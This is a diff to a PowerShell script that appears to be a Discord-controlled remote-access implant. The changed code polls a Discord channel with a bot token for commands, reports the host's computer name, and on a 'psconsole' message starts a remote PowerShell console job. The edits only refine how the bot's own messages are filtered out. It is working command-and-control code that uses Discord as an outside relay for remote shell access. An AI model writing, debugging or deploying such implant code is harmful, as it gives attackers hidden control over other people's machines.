@@ -1195,7 +1195,7 @@ $process
 
 # Scriptblock for PS console in discord
 $doPowershell = {
-param([string]$token,[string]$PowershellID)
+param([string]$token,[string]$PowershellID,[string]$botId)
     sleep 5
     $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
     $w = New-Object System.Net.WebClient
@@ -1210,7 +1210,7 @@ param([string]$token,[string]$PowershellID)
     while($true){
         $msg = $w.DownloadString($url)
         $r = ($msg | ConvertFrom-Json)[0]
-        if(-not $r.author.bot){
+        if(-not $r.author.id -eq $botId){
             $a = $r.timestamp
             $msg = $r.content
         }
@@ -1469,7 +1469,7 @@ Function Get-BotUserId {
     $botInfo = $botInfo | ConvertFrom-Json
     return $botInfo.id
 }
-$botId = Get-BotUserId
+$global:botId = Get-BotUserId
 # Create category and new channels
 NewChannelCategory
 sleep 1
@@ -1566,7 +1566,7 @@ while ($true) {
     $wc.Headers.Add("Authorization", $headers.Authorization)
     $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
     $most_recent_message = ($messages | ConvertFrom-Json)[0]
-    if (-not $message.author.id -eq $botId) {
+    if (-not $most_recent_message.author.bot) {
         $latestMessageId = $most_recent_message.timestamp
         $messages = $most_recent_message.content
     }
@@ -1595,7 +1595,7 @@ while ($true) {
         }
         if ($messages -eq 'psconsole'){
             if (!($PSrunning)){
-                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
+                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID, $global:botID
                 sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
